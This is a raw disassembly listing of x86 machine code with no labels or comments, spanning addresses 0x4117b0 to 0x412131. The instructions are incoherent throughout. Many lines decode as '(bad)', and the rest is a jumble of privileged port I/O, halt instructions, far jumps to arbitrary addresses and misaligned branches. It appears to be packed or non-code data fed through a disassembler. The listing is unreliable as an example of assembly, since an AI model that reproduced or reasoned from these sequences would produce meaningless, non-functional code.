  4117b0:	cmp    DWORD PTR [eax-0x43273803],0xffffffff
  4117b7:	dec    DWORD PTR ds:0xd5036a01
  4117bd:	jmp    0xb8c4162e
  4117c2:	or     eax,0xf01dab6
  4117c7:	mov    dh,0x42
  4117c9:	add    eax,ecx
  4117cb:	loopne 0x4117b2
  4117cd:	std    
  4117ce:	ror    BYTE PTR [ebp+0x558908e9],0x3d
  4117d5:	jg     0x41175b
  4117d7:	test   ch,cl
  4117d9:	or     BYTE PTR [eax],al
  4117db:	cmp    ebp,DWORD PTR [ebx+0x5c]
  4117de:	jp     0x4117ec
  4117e0:	sbb    cl,BYTE PTR [edx+0x36]
  4117e3:	add    ebp,ecx
  4117e5:	or     BYTE PTR [eax],al
  4117e7:	jmp    0x411f0e
  4117ec:	es inc edx
  4117ee:	or     al,cl
  4117f0:	inc    DWORD PTR ds:0x7da95589
  4117f6:	push   esp
  4117f7:	adc    dh,al
  4117f9:	sbb    BYTE PTR [edx+0x437d2c14],cl
  4117ff:	adc    al,0x14
  411801:	pop    esp
  411802:	push   es
  411803:	mov    ebp,DWORD PTR [ebx+0x4]
  411806:	mov    ecx,ebx
  411808:	out    0x3e,al
  41180a:	mov    WORD PTR [ecx],sp
  41180d:	pop    ecx
  41180e:	add    cl,BYTE PTR [ebx+0x385420f4]
	...
  41182c:	add    BYTE PTR [ecx+0x748f094d],bh
  411832:	pop    ebp
  411833:	add    al,BYTE PTR [eax]
  411835:	ja     0x4117d5
  411837:	add    eax,0x6b2db189
  41183c:	je     0x411833
  41183e:	pop    ebp
  41183f:	add    cl,BYTE PTR [ebx+0x3d27a]
  411845:	hlt    
  411846:	cs dec ebx
  411848:	cmp    ch,BYTE PTR ds:0x1e67e6b
  41184e:	pop    esi
  41184f:	add    bh,BYTE PTR [ecx]
  411851:	stos   DWORD PTR es:[edi],eax
  411852:	popa   
  411853:	or     DWORD PTR [ebp+0x23132],eax
  411859:	jg     0x4118c6
  41185b:	mov    ecx,DWORD PTR [ebp+0x25e68]
  411861:	outs   dx,DWORD PTR ds:[esi]
  411862:	mov    ds:0x5fd4c0f2,eax
  411867:	mov    dl,0xfe
  411869:	arpl   WORD PTR [edx+0x59],bp
  41186c:	jne    0x41185e
  41186e:	ret    0x5ff0
  411871:	add    bl,BYTE PTR [esi+0x3a3b8b02]
  411877:	lea    edi,[esi-0x4]
  41187a:	in     al,0xc0
  41187c:	movq   mm5,QWORD PTR [eax+0x59b0826a]
  411883:	mov    eax,DWORD PTR [esp+ecx*1-0xb]
  411887:	adc    al,0xfb
  411889:	stos   DWORD PTR es:[edi],eax
  41188a:	cli    
  41188b:	or     dh,BYTE PTR [esi+0x448b5d3b]
	...
  4118a9:	add    ah,bh
  4118ab:	fiadd  WORD PTR [edx+0x1]
  4118ae:	popf   
  4118af:	aas    
  4118b0:	pop    ebp
  4118b1:	dec    BYTE PTR [ebx+0x3423c0e6]
  4118b7:	outs   dx,BYTE PTR ds:[esi]
  4118b8:	in     al,dx
  4118b9:	dec    DWORD PTR ds:0xe85ae905
  4118bf:	in     al,dx
  4118c0:	imul   esi,DWORD PTR [edx-0x2f2a450a],0xfffffff3
  4118c7:	jg     0x41186a
  4118c9:	pop    edx
  4118ca:	loopne 0x4118cc
  4118cc:	(bad)  
  4118cd:	sar    bl,1
  4118cf:	pop    esp
  4118d0:	test   eax,0x69534a5d
  4118d5:	pop    ebx
  4118d6:	hlt    
  4118d7:	fdivr  st,st(4)
  4118d9:	sbb    ch,bl
  4118db:	push   eax
  4118dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118dd:	pop    edx
  4118de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118df:	sub    DWORD PTR [ebx+eax*2-0x59],esp
  4118e3:	call   ebx
  4118e5:	stc    
  4118e6:	pop    ds
  4118e7:	push   ebx
  4118e8:	lea    ecx,[edx]
  4118ea:	jno    0x411880
  4118ec:	int3   
  4118ed:	add    esi,esp
  4118ef:	add    esi,DWORD PTR [edi]
  4118f1:	ret    0x3f4
  4118f4:	aas    
  4118f5:	retf   0x45f5
  4118f8:	mov    BYTE PTR [ebx],cl
  4118fa:	out    dx,eax
  4118fb:	inc    ebp
  4118fc:	jmp    0xb5538c5c
  411901:	iret   
  411902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411903:	pop    esi
  411904:	out    dx,al
  411905:	mov    ?,WORD PTR [ecx]
  411907:	aad    0x5f
  411909:	shl    bl,0x84
  41190c:	add    eax,0xb1
	...
  411925:	add    BYTE PTR [eax],al
  411927:	add    cl,BYTE PTR [ecx+0x52cbf733]
  41192d:	ds shl bl,0x3
  411931:	fiadd  WORD PTR [eax+0x3e8f038]
  411937:	add    ebx,DWORD PTR [ebx-0x6504fb5b]
  41193d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41193e:	add    eax,0xee065b5
  411943:	mov    ch,0x6
  411945:	add    DWORD PTR [ebx+0x6774b8d2],eax
  41194b:	jle    0x4118d8
  41194d:	jmp    FWORD PTR [eax-0x9]
  411950:	add    al,0x0
  411952:	push   0x36
  411954:	pop    es
  411955:	mov    DWORD PTR [eax+ebp*2],ebp
  411958:	pop    ebp
  411959:	xchg   edx,eax
  41195a:	jecxz  0x411929
  41195c:	push   edx
  41195d:	mov    ch,BYTE PTR [esp+edx*1]
  411960:	lds    ecx,FWORD PTR [edi+0x43]
  411963:	lock fdivp st(7),st
  411966:	lds    eax,FWORD PTR [ebx-0x6]
  411969:	mov    WORD PTR [esi],ss
  41196b:	icebp  
  41196c:	mov    edx,0x7f483cfe
  411971:	retf   0x2bae
  411974:	(bad)  
  411975:	(bad)  
  411976:	sbb    al,0x0
  411978:	pop    ebp
  411979:	xor    esp,DWORD PTR [ebx-0x6e7dad33]
  41197f:	test   DWORD PTR [ecx],0x521c6c84
  411985:	inc    ah
  411987:	push   cs
  411988:	dec    esi
  411989:	(bad)  
  41198a:	jle    0x41198c
	...
  4119a4:	std    
  4119a5:	mov    BYTE PTR [ecx+0x3d04f7d5],dl
  4119ab:	int    0xa3
  4119ad:	push   edx
  4119ae:	(bad)  
  4119af:	fisttp QWORD PTR [eax]
  4119b1:	adc    BYTE PTR [ebx],bl
  4119b3:	pop    ebp
  4119b4:	dec    ebp
  4119b5:	push   ebx
  4119b6:	jae    0x4119bd
  4119b8:	or     ebp,edi
  4119ba:	sti    
  4119bb:	dec    esi
  4119bc:	cmp    eax,0x386c24d6
  4119c1:	(bad)  
  4119c2:	or     bh,ah
  4119c4:	int    0x4d
  4119c6:	(bad)  
  4119c7:	ss in  eax,dx
  4119c9:	xchg   DWORD PTR [ebx],eax
  4119cb:	add    eax,0x5f0f04f0
  4119d0:	mov    ch,0x4
  4119d2:	xorps  xmm7,XMMWORD PTR [ebp-0xff63efd]
  4119d9:	std    
  4119da:	shr    dl,0x3f
  4119dd:	sar    BYTE PTR [esi],cl
  4119df:	add    BYTE PTR [ecx+0x41],dh
  4119e2:	xchg   edx,eax
  4119e3:	jmp    0x411986
  4119e5:	cld    
  4119e6:	mov    ch,0x47
  4119e8:	mov    esp,?
  4119ea:	mov    ch,0x4f
  4119ec:	pop    esi
  4119ee:	fimul  WORD PTR [eax]
  4119f0:	data16 mov BYTE PTR [ecx],0xf8
  4119f4:	fucomp st(4)
  4119f6:	push   ebx
  4119f7:	je     0x411a32
  4119f9:	mov    bl,0x43
  4119fb:	and    BYTE PTR [esp+edi*8-0x7c],cl
  4119ff:	int3   
  411a00:	pop    ecx
  411a01:	add    eax,0x8928300
  411a06:	jmp    0x411b0a
	...
  411a1f:	add    BYTE PTR [eax],al
  411a21:	test   BYTE PTR [ebp+edi*8-0xbb3cf1],ch
  411a28:	push   cs
  411a29:	sar    DWORD PTR [eax+eax*1],cl
  411a2c:	sar    DWORD PTR [ebp-0x3],0xa
  411a30:	shl    DWORD PTR [esi],0xd
  411a33:	cmp    bl,BYTE PTR [esi-0xb]
  411a36:	sti    
  411a37:	sbb    DWORD PTR [edx],0x3b000519
  411a3d:	jmp    0x411a6f
  411a3f:	jno    0x411a1c
  411a41:	xchg   esp,eax
  411a42:	mov    esi,DWORD PTR [esi-0x15]
  411a45:	arpl   WORD PTR [eax+0x4940303b],cx
  411a4b:	(bad)  
  411a4c:	(bad)  
  411a4d:	fcmovbe st,st(0)
  411a4f:	cwde   
  411a50:	add    ch,cl
  411a52:	add    al,0xf
  411a54:	mov    dh,0x92
  411a56:	add    ecx,DWORD PTR [ebx-0x7c8456b2]
  411a5c:	ins    BYTE PTR es:[edi],dx
  411a5d:	or     ch,BYTE PTR [ebp+0x8938bfd]
  411a63:	mov    DWORD PTR [ebp-0x25283],eax
  411a69:	es inc esi
  411a6b:	sub    sp,bp
  411a6e:	jp     0x4119fb
  411a70:	js     0x411a66
  411a72:	not    BYTE PTR [edi-0x2]
  411a75:	outs   dx,DWORD PTR ds:[esi]
  411a76:	jno    0x411a82
  411a78:	sub    edi,DWORD PTR [ebp+edx*8+0x4f8b737d]
  411a7f:	push   esi
  411a80:	mov    BYTE PTR [ecx-0x26],dh
  411a83:	push   edi
  411a84:	inc    BYTE PTR [eax]
	...
  411a9e:	jnp    0x411a83
  411aa0:	dec    ebx
  411aa1:	sub    bh,BYTE PTR [edi+edx*2]
  411aa4:	mov    WORD PTR [esi-0xa],es
  411aa7:	pushf  
  411aa8:	arpl   WORD PTR [edi],ax
  411aaa:	ins    DWORD PTR es:[edi],dx
  411aab:	sub    DWORD PTR [esi+ecx*1+0xb02efa2],eax
  411ab2:	xor    eax,0xf14e8c57
  411ab7:	aam    0xc0
  411ab9:	(bad)  
  411aba:	repz iret 
  411abc:	mov    esi,0xb3e3503
  411ac1:	or     esi,DWORD PTR ds:0x7f93c0d5
  411ac7:	sub    esp,esi
  411ac9:	cwde   
  411aca:	iret   
  411acb:	fwait
  411acc:	xor    al,0xf7
  411ace:	ins    DWORD PTR es:[edi],dx
  411acf:	sub    DWORD PTR [eax+0x3e27a8a],eax
  411ad5:	add    ah,dh
  411ad7:	aam    0xc0
  411ad9:	xchg   DWORD PTR [edi-0x20],ebp
  411adc:	jnp    0x411add
  411ade:	sti    
  411adf:	pop    ebp
  411ae0:	xchg   DWORD PTR [esp+ebx*2-0x4c01a919],ecx
  411ae7:	call   0xb72519d7
  411aec:	add    al,0x0
  411aee:	hlt    
  411aef:	pop    ebp
  411af0:	mov    eax,DWORD PTR [eax+eax*4-0x3a]
  411af4:	lock das 
  411af6:	rcr    DWORD PTR [edx+0x66b48502],1
  411afc:	test   DWORD PTR [ebp+0xf025df0],esp
	...
  411b1a:	add    BYTE PTR [esp+eax*1+0x26],bh
  411b1e:	and    dh,ah
  411b20:	add    al,0x6a
  411b22:	aas    
  411b23:	stc    
  411b24:	pop    ebp
  411b25:	(bad)  
  411b26:	pop    esp
  411b27:	call   0xa37d:0xe7d95f4f
  411b2e:	push   ebx
  411b2f:	jle    0x411afa
  411b31:	(bad)
  411b35:	call   0x5c321b90
  411b3a:	scas   eax,DWORD PTR es:[edi]
  411b3b:	test   BYTE PTR [edi+0x5b],0xfc
  411b3f:	jle    0x411b7c
  411b41:	ss push edi
  411b43:	call   0xf011f13c
  411b48:	dec    edi
  411b49:	push   ebx
  411b4a:	or     al,0x5c
  411b4c:	cmp    al,0xc0
  411b4e:	push   esi
  411b4f:	dec    edx
  411b50:	add    eax,0x4
  411b53:	enter  0x6c29,0x43
  411b57:	(bad)  
  411b58:	sti    
  411b59:	jmp    0x411b50
  411b5b:	das    
  411b5c:	dec    edi
  411b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b5e:	push   es
  411b5f:	jno    0x411af1
  411b61:	retf   0xf403
  411b64:	call   FWORD PTR [esi-0x42]
  411b67:	hlt    
  411b68:	call   DWORD PTR [esi-0x3a]
  411b6b:	cmc    
  411b6c:	inc    ebp
  411b6d:	mov    BYTE PTR [ebx],cl
  411b6f:	inc    DWORD PTR [ebp-0x17]
  411b72:	pop    ebx
  411b73:	or     DWORD PTR [edi],0x1d
  411b76:	rol    BYTE PTR [edx+0x5b],1
  411b79:	out    0x8a,al
  411b7b:	cmp    ebp,edx
  411b7d:	outs   dx,DWORD PTR ds:[esi]
  411b7e:	rol    BYTE PTR [eax],0x0
	...
  411b95:	add    BYTE PTR [eax],al
  411b97:	add    bl,dh
  411b99:	jp     0x411b80
  411b9b:	pop    ss
  411b9c:	inc    ecx
  411b9d:	fchs   
  411b9f:	pop    ss
  411ba0:	inc    eax
  411ba1:	(bad)  
  411ba2:	arpl   WORD PTR [eax],ax
  411ba4:	out    dx,eax
  411ba5:	add    al,0xe9
  411ba7:	push   es
  411ba8:	add    dh,0xe7
  411bab:	push   es
  411bac:	mov    bh,BYTE PTR [esi+0x2e30eaff]
  411bb2:	pop    es
  411bb3:	loop   0x411bed
  411bb5:	add    edi,eax
  411bb7:	imul   eax,DWORD PTR [edx],0x770d73b9
  411bbd:	andnps xmm4,XMMWORD PTR [edx+0x19]
  411bc1:	into   
  411bc2:	(bad)  
  411bc3:	call   0x7d9e95bf
  411bc8:	js     0x411b93
  411bca:	pmaxsw mm0,QWORD PTR [ebx]
  411bcd:	ins    DWORD PTR es:[edi],dx
  411bce:	std    
  411bcf:	mul    BYTE PTR [ecx]
  411bd1:	or     ebx,DWORD PTR [ebp-0x7]
  411bd4:	stc    
  411bd5:	mov    BYTE PTR [edi-0x73b13e19],cl
  411bdb:	es cmc 
  411bdd:	test   BYTE PTR [edi],dh
  411bdf:	lock outs dx,BYTE PTR ds:[esi]
  411be1:	leave  
  411be2:	pop    ds
  411be3:	push   esp
  411be4:	stc    
  411be5:	jns    0x411c33
  411be7:	loope  0x411bd9
  411be9:	xchg   esi,eax
  411bea:	inc    esi
  411beb:	in     eax,0x74
  411bed:	gs mul edx
  411bf0:	mov    dh,0x7c
  411bf2:	inc    esp
  411bf3:	sar    DWORD PTR [ecx+ecx*8+0x23],1
  411bf7:	sub    DWORD PTR [eax+0xf],esi
  411bfa:	push   edi
  411bfb:	jb     0x411bfd
	...
  411c15:	lods   eax,DWORD PTR ds:[esi]
  411c16:	mov    ebp,0xf71c6c0e
  411c1b:	(bad)  
  411c1c:	call   0x1360d59d
  411c21:	lock dec ebp
  411c23:	je     0x411c02
  411c25:	test   al,0xd8
  411c27:	pop    ss
  411c28:	pop    ds
  411c29:	mov    eax,ds:0xc36e0fd8
  411c2e:	stc    
  411c2f:	(bad)  
  411c30:	fdiv   st(7),st
  411c32:	pop    esp
  411c33:	adc    esp,DWORD PTR [ecx+0x49]
  411c36:	dec    edi
  411c37:	test   BYTE PTR [ecx],ch
  411c39:	icebp  
  411c3a:	xchg   DWORD PTR [ebx],edx
  411c3c:	or     edi,eax
  411c3e:	add    al,0x8b
  411c40:	add    BYTE PTR [eax-0x55bb18a3],dh
  411c46:	add    DWORD PTR [eax],eax
  411c48:	(bad)  
  411c4a:	nop
  411c4b:	dec    DWORD PTR [esi]
  411c4d:	sub    ecx,DWORD PTR [eax+0x0]
  411c50:	sar    ebp,0x0
  411c53:	or     eax,ecx
  411c55:	mov    gs,WORD PTR [ecx+0x3d593f7e]
  411c5b:	jmp    0x6ff:0xfda9b7e9
  411c62:	mov    fs,WORD PTR [edx]
  411c64:	inc    edi
  411c65:	dec    ebp
  411c66:	xchg   ecx,eax
  411c67:	push   0x1a3e8200
  411c6c:	mov    ecx,DWORD PTR [edx]
  411c6e:	mov    eax,0xbce61873
  411c73:	push   esp
  411c74:	dec    eax
  411c76:	pop    eax
  411c77:	std    
  411c78:	jne    0x411c7a
	...
  411c92:	push   ecx
  411c93:	mov    eax,0xbb350873
  411c98:	cmc    
  411c99:	push   DWORD PTR [edx]
  411c9b:	into   
  411c9c:	mov    esi,0x1fbbd80f
  411ca1:	add    BYTE PTR [ebp+0x8],cl
  411ca4:	mov    dh,0x47
  411ca6:	sbb    al,0x8
  411ca8:	mov    dh,0x4f
  411caa:	pop    ds
  411cab:	ret    0x8de
  411cae:	es ret 0xf801
  411cb2:	(bad)  
  411cb3:	clc    
  411cb4:	push   ebx
  411cb5:	je     0x411c48
  411cb7:	fcmovu st,st(7)
  411cb9:	std    
  411cba:	jb     0x411c74
  411cbc:	inc    ebp
  411cbd:	mov    ebx,DWORD PTR [edx+0x8]
  411cc0:	mov    dh,0x48
  411cc2:	or     al,0x8
  411cc4:	mov    dh,0x50
  411cc6:	ffreep st(7)
  411cc8:	fisttp WORD PTR [eax]
  411cca:	out    0xbe,al
  411ccc:	add    ecx,eax
  411cce:	dec    ebp
  411ccf:	lock push ebx
  411cd1:	je     0x411cc7
  411cd3:	rol    DWORD PTR [edi-0x4e62e7b4],0x69
  411cda:	hlt    
  411cdb:	ret    0x1bcd
  411cde:	jno    0x411d4e
  411ce0:	(bad)  
  411ce1:	inc    BYTE PTR [ecx+0x36]
  411ce4:	xchg   edx,ecx
  411ce6:	dec    edx
  411ce7:	sbb    ecx,esi
  411ce9:	bts    DWORD PTR [ecx+0x6],ebp
  411ced:	jmp    FWORD PTR [ecx]
  411cef:	push   esi
  411cf0:	push   0x70
  411cf2:	mov    ds:0x8453f3,eax
	...
  411d0f:	mov    ah,0x2b
  411d11:	jge    0x411d83
  411d13:	aad    0x5d
  411d15:	add    ch,cl
  411d17:	push   edi
  411d18:	push   ebx
  411d19:	push   edx
  411d1a:	(bad)  
  411d1b:	xor    esp,DWORD PTR [ebx-0x74]
  411d1e:	inc    esi
  411d1f:	cmc    
  411d20:	sub    cl,BYTE PTR [esi+ecx*2+0x7639cf6]
  411d27:	out    dx,eax
  411d28:	pushf  
  411d29:	push   es
  411d2a:	clc    
  411d2b:	je     0x411d20
  411d2d:	mov    bh,0x73
  411d2f:	pusha  
  411d30:	inc    ebp
  411d31:	test   esp,edi
  411d33:	dec    ebx
  411d34:	inc    ebx
  411d35:	add    dh,BYTE PTR [esi-0x49fea34d]
  411d3b:	mov    bl,0x5f
  411d3d:	inc    ebx
  411d3e:	loopne 0x411d3c
  411d40:	data16 cmp cl,BYTE PTR [edx+0x7f433733]
  411d47:	fdiv   st(4),st
  411d49:	jl     0x411d8f
  411d4b:	add    al,dh
  411d4d:	repz mov al,cl
  411d50:	pop    ecx
  411d51:	jge    0x411da3
  411d53:	lock (bad) 
  411d55:	cld    
  411d56:	mov    BYTE PTR [ecx-0x27b38333],ch
  411d5c:	xchg   BYTE PTR [edi],al
  411d5e:	sbb    DWORD PTR [ecx-0x32],0x3
  411d62:	mov    bh,ah
  411d64:	add    al,0x69
  411d66:	dec    ebp
  411d67:	dec    ebx
  411d68:	cld    
  411d69:	fs cmp al,0xfe
  411d6c:	add    al,0xe9
  411d6e:	or     esp,0xffffffad
  411d71:	fld    QWORD PTR [edi+0x0]
	...
  411d8b:	add    BYTE PTR [edx+0x7403e8ef],cl
  411d91:	dec    ebp
  411d92:	mov    ds:0xd1927002,al
  411d97:	add    esi,esp
  411d99:	test   BYTE PTR [edi],ch
  411d9b:	scas   eax,DWORD PTR es:[edi]
  411d9c:	cli    
  411d9d:	adc    BYTE PTR [ebx-0x11],0xa3
  411da1:	dec    ebx
  411da2:	push   0x6cfc384d
  411da7:	test   al,0xee
  411da9:	add    al,0xe9
  411dab:	or     DWORD PTR [ebx+ebp*4+0x4e03fc7c],0xffffff8a
  411db3:	add    dh,BYTE PTR [ecx+0x6f]
  411db6:	call   0x373d11be
  411dbb:	mov    esp,0xc39efbf6
  411dc0:	test   DWORD PTR [ebp-0x39],0x633ceefb
  411dc7:	idiv   esp
  411dc9:	jge    0x411de6
  411dcb:	pop    eax
  411dcc:	jl     0x411e48
  411dce:	ins    BYTE PTR es:[edi],dx
  411dcf:	add    esi,esp
  411dd1:	add    al,0x2
  411dd3:	mov    edx,0x4adfc8e7
  411dd8:	mov    ecx,0xf403e80c
  411ddd:	add    al,0x92
  411ddf:	and    DWORD PTR [edi-0x3e],ebp
  411de2:	in     al,dx
  411de3:	jle    0x411e12
  411de5:	jg     0x411e25
  411de7:	hlt    
  411de8:	fidiv  WORD PTR [ecx+0x74e77e94]
  411dee:	outs   dx,DWORD PTR ds:[esi]
  411def:	test   DWORD PTR [eax],0x0
	...
  411e09:	jnp    0x411e8a
  411e0b:	push   ss
  411e0c:	add    BYTE PTR [edi+0x47],ch
  411e0f:	inc    ecx
  411e11:	mov    ebp,0x6a2588e2
  411e16:	push   es
  411e17:	mov    esi,DWORD PTR [ebx+ecx*2-0x170ffc87]
  411e1e:	mov    edi,0x85fdd60f
  411e23:	mov    edi,0xfc148eb
  411e28:	jb     0x411e67
  411e2a:	jbe    0x411e2b
  411e2c:	call   0xbe129e28
  411e31:	add    BYTE PTR [edx+ecx*2],cl
  411e34:	in     eax,0xcc
  411e36:	push   ss
  411e37:	mov    esp,DWORD PTR [ebx]
  411e39:	and    bh,bl
  411e3b:	mov    BYTE PTR [edi+0x23],ch
  411e3e:	dec    edx
  411e3f:	(bad)  
  411e40:	jmp    0x2850e157
  411e45:	pop    ss
  411e46:	add    al,0x50
  411e48:	push   es
  411e49:	sahf   
  411e4a:	(bad)  
  411e4b:	(bad)  
  411e4c:	ja     0x411ec9
  411e4e:	dec    ebx
  411e4f:	adc    al,0xa5
  411e51:	ins    DWORD PTR es:[edi],dx
  411e52:	or     al,BYTE PTR [eax]
  411e54:	bound  edi,QWORD PTR [esi]
  411e56:	test   BYTE PTR [edx+0x447d6066],0xf9
  411e5d:	fadd   st,st(0)
  411e5f:	out    0x6a,eax
  411e61:	mov    esp,0x582488fd
  411e66:	pop    ebp
  411e67:	xchg   BYTE PTR [edi+0x248a4aa5],bh
	...
  411e85:	add    BYTE PTR [edx+ecx*8],bh
  411e88:	ds sbb al,0xb1
  411e8b:	mov    eax,0xf26b60e7
  411e90:	push   cs
  411e91:	ins    DWORD PTR es:[edi],dx
  411e92:	push   ss
  411e93:	dec    esi
  411e94:	(bad)  
  411e95:	sahf   
  411e96:	jmp    0x7c280e42
  411e9b:	loope  0x411e98
  411e9d:	mov    fs,WORD PTR [ebp-0x13ffc837]
  411ea3:	push   edi
  411ea4:	mov    esi,0x81b76d83
  411ea9:	rcr    bh,0x85
  411eac:	cmp    eax,0x1e425457
  411eb1:	movmskps ebp,xmm0
  411eb4:	adc    al,0x0
  411eb6:	int    0xc8
  411eb8:	inc    ebx
  411eb9:	and    al,0x9d
  411ebb:	xchg   ebp,eax
  411ebc:	push   0x1a323a00
  411ec1:	lea    esp,[edx+0x0]
  411ec4:	push   ecx
  411ec5:	push   esi
  411ec6:	cli    
  411ec7:	xor    DWORD PTR [esi],ecx
  411ec9:	mov    edx,esi
  411ecb:	mov    bl,0x73
  411ecd:	or     al,0xda
  411ecf:	xor    DWORD PTR [esi],eax
  411ed1:	call   0x3ed0d8
  411ed6:	adc    cl,al
  411ed8:	or     eax,0xfe53f285
  411edd:	jmp    DWORD PTR [edx+eax*2+0x7f100f1e]
  411ee4:	sbb    BYTE PTR [eax],al
  411ee6:	(bad)  
  411ee7:	enter  0x147b,0x0
	...
  411f03:	hlt    
  411f04:	and    dl,BYTE PTR ds:0x7c805d00
  411f0a:	cmp    al,0x4d
  411f0c:	xor    DWORD PTR [edi],eax
  411f0e:	cmp    ebx,DWORD PTR [ebx]
  411f10:	sub    DWORD PTR ds:0xfe591c84,ecx
  411f16:	jmp    DWORD PTR [ebx]
  411f18:	inc    edx
  411f19:	push   ss
  411f1a:	add    al,BYTE PTR [ecx]
  411f1c:	sub    ecx,DWORD PTR [ecx-0x27085ab2]
  411f22:	je     0x411f2c
  411f24:	clc    
  411f25:	pop    ebp
  411f26:	ins    BYTE PTR es:[edi],dx
  411f27:	dec    edx
  411f28:	sub    DWORD PTR [ecx],0x8b050d18
  411f2e:	inc    esi
  411f2f:	cmc    
  411f30:	cmp    DWORD PTR [esi+0xb3bf474],0xeee1fbd9
  411f3a:	pop    ss
  411f3b:	hlt    
  411f3c:	pop    ebx
  411f3d:	fdiv   st(7),st
  411f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f40:	jmp    0x411fc0
  411f42:	push   ebp
  411f43:	adc    bl,ah
  411f45:	inc    ebx
  411f46:	out    0x81,eax
  411f48:	call   0x8400:0x1e790002
  411f4f:	repnz add eax,0x1df0004
  411f55:	jge    0x411f9c
  411f57:	call   0x9d7b59b6
  411f5c:	dec    edi
  411f5d:	test   dh,dh
  411f5f:	jecxz  0x411fbe
  411f61:	add    cl,BYTE PTR [ebx-0x76c3fc41]
	...
  411f7f:	add    BYTE PTR ds:0xf32bb854,al
  411f85:	fcomp  DWORD PTR [edx+0x16]
  411f88:	hlt    
  411f89:	pop    ebp
  411f8a:	xor    edi,0xfffffff5
  411f8d:	imul   edi,esi,0xc5d3589
  411f93:	inc    esi
  411f94:	ror    DWORD PTR [esi-0x7b],1
  411f97:	(bad)  
  411f98:	jecxz  0x411ff7
  411f9a:	add    al,BYTE PTR [edi+0x5d]
  411f9d:	mov    al,0x55
  411f9f:	(bad)  
  411fa0:	imul   edx,DWORD PTR [ebx+0x2f4f67b0],0x7a
  411fa7:	test   DWORD PTR [esi+ebx*2+0x2],ebp
  411fab:	add    bh,dh
  411fad:	pop    ss
  411fae:	fdivr  QWORD PTR [edx]
  411fb0:	sub    al,0x43
  411fb2:	popa   
  411fb3:	mov    BYTE PTR [ecx+0x42e25955],ah
  411fb9:	and    esp,ebp
  411fbb:	add    DWORD PTR [eax-0x67b284e8],ebp
  411fc1:	push   edx
  411fc2:	sub    esi,DWORD PTR [edx-0x24]
  411fc5:	add    al,0x72
  411fc7:	mov    BYTE PTR [ebx],0x82
  411fca:	test   al,0xd8
  411fcc:	add    bl,bl
  411fce:	call   0xecf09886
  411fd3:	jp     0x41200b
  411fd5:	pop    ebp
  411fd6:	dec    esi
  411fd7:	or     esi,esp
  411fd9:	add    al,0x92
  411fdb:	jge    0x41205b
  411fdd:	mov    esi,0xbbc1ad4
  411fe2:	nop
  411fe3:	inc    DWORD PTR [eax]
	...
  411ffd:	jp     0x412079
  411fff:	std    
  412000:	add    esi,esp
  412002:	jp     0x411ff5
  412004:	or     DWORD PTR [edx+0x19],eax
  412007:	out    0x88,al
  412009:	dec    edx
  41200a:	lock call 0xe78d9713
  412010:	xlat   BYTE PTR ds:[ebx]
  412011:	xchg   esi,eax
  412012:	jp     0x411fbd
  412014:	add    al,0x9f
  412016:	jno    0x412081
  412018:	into   
  412019:	jmp    0x41201f
  41201b:	inc    edx
  41201c:	jb     0x412094
  41201e:	(bad)  
  41201f:	test   al,0x3
  412021:	jmp    0x411fa4
  412023:	xor    esi,0xffffff93
  412026:	inc    edi
  412027:	imul   ecx,esi,0xe494053b
  41202d:	outs   dx,BYTE PTR ds:[esi]
  41202e:	mov    dh,0x94
  412030:	or     bl,BYTE PTR [ebp-0x46849830]
  412036:	in     al,dx
  412037:	imul   eax,DWORD PTR [edi+eiz*8-0x19],0xffffffb1
  41203c:	sub    al,0xf2
  41203e:	sub    DWORD PTR [edi],0xfffffff7
  412041:	pop    ebx
  412042:	inc    edi
  412043:	push   edx
  412044:	add    al,0xa4
  412046:	jns    0x412086
  412048:	lock jle 0x41208e
  41204b:	sar    BYTE PTR [esi+edi*8+0x7b88e904],0xf7
  412053:	fs pop ss
  412055:	or     eax,DWORD PTR ds:0x1ccee900
  41205b:	mov    esp,DWORD PTR [edi]
  41205d:	and    al,0x1a
  41205f:	enter  0xe2,0x0
	...
  412077:	add    BYTE PTR [eax],al
  412079:	add    al,cl
  41207b:	test   BYTE PTR [esi-0x1b8f53c],0x63
  412082:	push   cs
  412083:	or     eax,0x8002bd4e
  412088:	sbb    esi,ebx
  41208a:	test   DWORD PTR [ebx+eax*4],0xbd0f881
  412091:	arpl   WORD PTR [esi+0x15273a05],si
  412097:	test   BYTE PTR [eax+esi*8+0x72fe46e2],0xb9
  41209f:	fisubr DWORD PTR [edx]
  4120a1:	scas   eax,DWORD PTR es:[edi]
  4120a2:	fistp  DWORD PTR [ebp+0x3a]
  4120a5:	dec    esi
  4120a6:	xor    al,BYTE PTR [edi+0x3a]
  4120a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120aa:	fwait
  4120ab:	test   DWORD PTR [ecx-0x1b956cc],0xfe479840
  4120b5:	cs push ds
  4120b7:	mov    eax,0xf6c8e26b
  4120bc:	sub    edi,0x42
  4120bf:	inc    edi
  4120c0:	(bad)  
  4120c1:	bound  esi,QWORD PTR [ecx-0x54d67b12]
  4120c7:	and    DWORD PTR [ebx],edi
  4120c9:	and    BYTE PTR [esi-0x5816960b],ah
  4120cf:	jns    0x412126
  4120d1:	aad    0xee
  4120d3:	inc    edx
  4120d4:	out    0x13,eax
  4120d6:	in     eax,dx
  4120d7:	add    al,0x0
  4120d9:	ins    BYTE PTR es:[edi],dx
  4120da:	mov    al,0xd0
  4120dc:	sub    al,0x1a
	...
  4120f6:	add    BYTE PTR [eax-0x311ab386],bh
  4120fc:	ja     0x412099
  4120fe:	jmp    0x12a25fa
  412103:	add    dl,BYTE PTR [edi-0x2]
  412106:	jmp    DWORD PTR [esi+0x552b1a3e]
  41210c:	cld    
  41210d:	fdiv   DWORD PTR [edi+0x3a]
  412110:	retf   
  412111:	or     DWORD PTR [edx],edi
  412113:	jecxz  0x412139
  412115:	jne    0x4120f7
  412117:	sahf   
  412118:	mov    eax,0xcc1573ff
  41211d:	inc    ecx
  41211e:	add    DWORD PTR [edi],esp
  412120:	inc    eax
  412121:	sub    esi,DWORD PTR [ebp+0x5e]
  412124:	int3   
  412125:	inc    esp
  412126:	ins    BYTE PTR es:[edi],dx
  412127:	(bad)  
  412128:	aas    
  412129:	sbb    bh,BYTE PTR [ebx]
  41212b:	test   DWORD PTR ds:0xb72be9c7,ebp
  412131:	std    
